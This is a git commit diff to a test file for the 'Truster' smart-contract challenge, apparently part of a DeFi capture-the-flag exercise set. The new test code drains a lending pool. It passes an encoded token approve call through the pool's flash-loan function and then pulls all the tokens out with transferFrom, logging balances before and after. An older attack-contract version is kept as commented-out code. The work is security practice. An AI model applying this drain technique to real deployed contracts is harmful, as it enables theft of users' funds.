984f39b45452592f0cf867ce1502356cd22c20a6
Thomas Pan <thomaspanf@gmail.com>
2022-07-11 16:23:07 -0700

    truster

--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -27,29 +27,37 @@ describe('[Challenge] Truster', function () {
         ).to.equal('0');
     });
 
-    // it('Exploit', async function () {
-    //     /** CODE YOUR EXPLOIT HERE  */
-    //     const ABI = "function approve(address spender, uint256 amount)";
-    //     const interface = new ethers.utils.Interface(ABI);
-    //     const data = interface.encodeFunctionData("approve", [attacker, TOKENS_IN_POOL.toString()]);
-
-    //     await this.pool.flashLoan(0, attacker, this.token.address, data); 
-    //     await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL); 
-    // });
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
-        const AttackTrusterDeployer = await ethers.getContractFactory("AttackTruster", attacker);
-        const attackContract = await AttackTrusterDeployer.deploy(this.pool.address, this.token.address); 
-        
-        const amount = 0;
-        const borrower = attacker.address;
-        const target = this.token.address;
+        console.log("before"); 
+        console.log(await this.token.balanceOf(this.pool.address)); 
+        console.log(await this.token.balanceOf(attacker.address)); 
 
-        const abi = ["function approve(address spender, uint256 amount)"]
-        const iface = new ethers.utils.interface(abi);
-        const data = iface.encodeFunctionData("approve", [attackContract.address,])
-        
+        const ABI = ["function approve(address, uint256)"];
+        const interface = new ethers.utils.Interface(ABI);
+        const data = interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL.toString()]);
+
+        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data);          // token.approve() : lending pool -> attacker
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
+
+        console.log("after"); 
+        console.log(await this.token.balanceOf(this.pool.address)); 
+        console.log(await this.token.balanceOf(attacker.address)); 
     });
+    // it('Exploit', async function () {
+    //     /** CODE YOUR EXPLOIT HERE  */
+    //     const AttackTrusterDeployer = await ethers.getContractFactory("AttackTruster", attacker);
+    //     const attackContract = await AttackTrusterDeployer.deploy(this.pool.address, this.token.address); 
+        
+    //     const amount = 0;
+    //     const borrower = attacker.address;
+    //     const target = this.token.address;
+
+    //     const abi = ["function approve(address spender, uint256 amount)"]
+    //     const iface = new ethers.utils.interface(abi);
+    //     const data = iface.encodeFunctionData("approve", [attackContract.address,])
+        
+    // });
 
 
     after(async function () {
